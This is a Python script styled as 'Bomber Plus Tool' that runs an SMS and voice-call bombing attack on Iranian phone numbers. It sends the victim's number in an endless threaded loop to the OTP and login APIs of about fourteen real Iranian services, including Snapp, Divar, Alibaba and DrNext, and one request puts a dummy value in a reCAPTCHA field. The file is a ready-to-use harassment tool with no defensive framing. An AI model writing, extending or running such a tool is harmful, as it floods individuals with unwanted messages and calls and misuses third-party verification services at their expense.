from platform import node, system, release; Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import random
import sys
import socket

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'  
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'     
d = '\033[90;1m'  

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS services
# ------------------------------
def trip_call(phone):
    url = "https://gateway.trip.ir/api/Totp"
    payload = {"PhoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Trip - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Trip - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Trip - Call Exception: {e}{a}')
        return False

def paklean_call(phone):
    url = "https://client.api.paklean.com/user/resendVoiceCode"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Paklean - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Paklean - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Paklean - Call Exception: {e}{a}')
        return False

def ragham_call(phone):
    url = "https://web.raghamapp.com/api/users/code"
    payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Ragham - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Ragham - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Ragham - Call Exception: {e}{a}')
        return False



def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
    snapD = {"cellphone": phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        return "OK" in snapR
    except Exception as e:
        print(f"{r}[!] Snap Exception: {e}")
        return False
def shahrfarsh(phone):
    url = "https://shahrfarsh.com/Account/Login"
    payload = {"phoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, data=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(ShahrFarsh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ShahrFarsh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] ShahrFarsh Exception: {e}{a}')
        return False
def tetherland(phone):
    url = "https://service.tetherland.com/api/v5/login-register"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Tetherland) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Tetherland) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Tetherland Exception: {e}{a}')
        return False


def pindo(phone):
    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
    try:
        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
            print(f'{g}(Pindo) {a}Code Sent')
            return True
    except Exception as e:
        print(f'[!] Pindo Exception: {e}')
        return False

def drnext(phone):
    phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    payload = {"source": "besina", "mobile": phoneNumber_zero}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(DrNext) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (DrNext) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] (DrNext) Exception: {e}{a}')

def gap(phone):
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
        return "OK" in gapR
    except Exception as e:
        print(f"{r}[!] Gap Exception: {e}")
        return False

def divar(phone):
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", json=divarD).json()
        return divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
    except Exception as e:
        print(f"{r}[!] Divar Exception: {e}")
        return False

def alibaba(phone):
    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
        return alibabaR.get("result", {}).get("success")
    except Exception as e:
        print(f"{r}[!] AliBaba Exception: {e}")
        return False

def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        meR = post(url=meU, data=meD).json()
        return meR.get('isSuccess')
    except Exception as e: 
        print(f"{r}[!] HamrahMechanic Exception: {e}")
        return False

def okorosh(phone):
    okJ = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "dummy"
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8'}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        return 'success' in okR
    except Exception as e:
        print(f"{r}[!] OfoghKourosh Exception: {e}")
        return False

def snapp_market(phone):
    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
    params = {"cellphone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, params=params, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Snapp Market) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Snapp Market Exception: {e}{a}')
        return False

# Wrapper to safely run each service
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response")

# Simple SMS bomber
def Vip(phone, Time):
    services = [
    snap, gap, divar, alibaba, mek, okorosh,
    drnext, pindo, shahrfarsh, tetherland, snapp_market,
    trip_call, paklean_call, ragham_call
]
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        system('clear' if name == 'posix' else 'cls')  

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# Menu
def main_menu():
    system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# Main loop
def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
